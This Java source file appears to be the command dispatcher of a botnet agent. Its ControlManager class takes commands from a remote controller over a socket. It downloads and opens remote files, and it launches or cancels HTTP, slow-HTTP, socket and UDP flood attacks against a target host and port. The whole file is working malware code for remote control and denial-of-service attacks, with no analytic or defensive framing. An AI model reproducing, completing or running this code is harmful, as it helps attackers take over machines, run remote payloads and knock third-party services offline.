package org.anywhere.agent.controller;

import org.anywhere.agent.Agent;
import org.anywhere.agent.controller.impl.DownloaderController;
import org.anywhere.agent.controller.impl.StopController;

import java.net.Socket;

public class ControlManager {

    private final DownloaderController downloaderController;
    private final StopController stopController;
    private final AttackManager attackManager;

    public ControlManager(final Agent agent) {
        this.downloaderController = new DownloaderController(agent);
        this.attackManager = new AttackManager();
        this.stopController = new StopController(this.attackManager);
    }

    public void read(final String type, final String text, final Socket socket) {
        if (socket == null || !socket.isConnected() || socket.isClosed())
            return;
        final Thread primaryThread = Thread.currentThread();
        final String[] split = text.split(":");
        new Thread(() -> {
            switch (type) {
                case "download":
                    this.downloaderController.downloadAndOpen(text);
                    break;
                case "stop":
                    this.stopController.stop(split[0]);
                    break;
                case "http":
                case "slowhttp":
                case "socket":
                case "udp":
                    this.attackManager.launch(type, split[0].replace("(doubleDot)", ":"), Integer.parseInt(split[1]), Integer.parseInt(split[2]), Integer.parseInt(split[3]), Integer.parseInt(split[4]));
                    break;
                case "cancel":
                    this.attackManager.cancel(Integer.parseInt(split[0]));
                    break;
            }
            this.close(primaryThread, Thread.currentThread());
        }).start();
    }

    private void close(final Thread primaryThread, final Thread secondThread) {
        if (primaryThread != secondThread && (!secondThread.isInterrupted() && secondThread.isAlive()))
            secondThread.interrupt();
    }
}